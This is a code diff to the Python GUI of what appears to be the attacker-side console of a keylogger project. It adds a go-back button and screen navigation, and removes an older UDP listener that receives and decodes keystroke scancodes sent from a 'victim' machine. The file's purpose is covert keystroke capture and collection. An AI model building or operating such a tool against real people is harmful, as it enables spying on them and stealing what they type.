@@ -230,12 +230,20 @@ class ChooseFrame(ctk.CTkFrame):
         self.app = app
 
         self.choosing_victim_frame = ChoosingVictimFrame(self, victims)
-        self.choosing_victim_frame.grid(row=1, column=0, padx=0, pady=0, sticky="nswe")
+        self.choosing_victim_frame.grid(row=1, column=0, columnspan=2, padx=0, pady=0, sticky="nswe")
         self.label = ctk.CTkLabel(self, text="Choose a victim", font=("Arial", 30))
-        self.label.grid(row=0, column=0, padx=0, pady=5, sticky="")
+        self.label.grid(row=0, column=0, columnspan=2, padx=0, pady=5, sticky="")
+        self.go_back_image = ctk.CTkImage(dark_image=Image.open("/home/gognl/vmbr/attacker/arrow.png"), size=(50, 50))
+        self.go_back_button = ctk.CTkButton(self, text="", image=self.go_back_image, command=self.go_back_callback, width=50, height=50, fg_color="transparent")
+        self.go_back_button.grid(row=0, column=0, padx=10, pady=10, sticky="w")
         self.grid_rowconfigure(0, weight=1)
-        self.grid_rowconfigure(1, weight=4)
+        self.grid_rowconfigure(1, weight=5)
         self.grid_columnconfigure(0, weight=1)
+        self.grid_columnconfigure(1, weight=5)
+    
+    def go_back_callback(self):
+        self.destroy()
+        self.app.redisplay_entry_frame()
 
 class ChoosingVictimFrame(ctk.CTkScrollableFrame):
     def __init__(self, app: ctk.CTk, victims: queue.Queue, **kwargs):
@@ -350,7 +358,6 @@ class App(ctk.CTk):
         self.settings_frame.grid(row=0, column=0, padx=0, pady=0, sticky="")
     
     def close_settings(self):
-        # self.settings_frame.configure(fg_color="transparent")
         for widget in self.entry_frame.winfo_children():
             widget.configure(state="normal")
         for widget in self.settings_frame.winfo_children():
@@ -359,13 +366,16 @@ class App(ctk.CTk):
         self.entry_frame.destroy()
         self.entry_frame = EntryFrame(self, fg_color="transparent")
         self.entry_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
-
     
     def start_choosing_window(self, victims: queue.Queue):
         self.scan_frame.destroy()
         self.choose_frame = ChooseFrame(self, victims, fg_color="transparent")
         self.choose_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
     
+    def redisplay_entry_frame(self):
+        self.entry_frame = EntryFrame(self, fg_color="transparent")
+        self.entry_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+
     def start_keylogging(self, victim):
         self.choose_frame.destroy()
         self.keylogger_frame = KeyloggerFrame(self, victim)
@@ -391,20 +401,6 @@ def main():
     app.protocol("WM_DELETE_WINDOW", app.cleanup)
     app.mainloop()
 
-
-    return
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_socket.bind(('', 59324))
-
-    print("\033[38;5;208mAttacker started. \033[3mWaiting for packets from victim...\033[0m")
-
-    while True:
-        message, address = server_socket.recvfrom(256)
-
-        len = int(message[0])
-        logs = decode_scancodes(message[1:])
-        print(f"\033[38;5;172mReceived: \033[38;5;223m{logs}\033[0m")
-    
 
 if __name__ == '__main__':
     main()
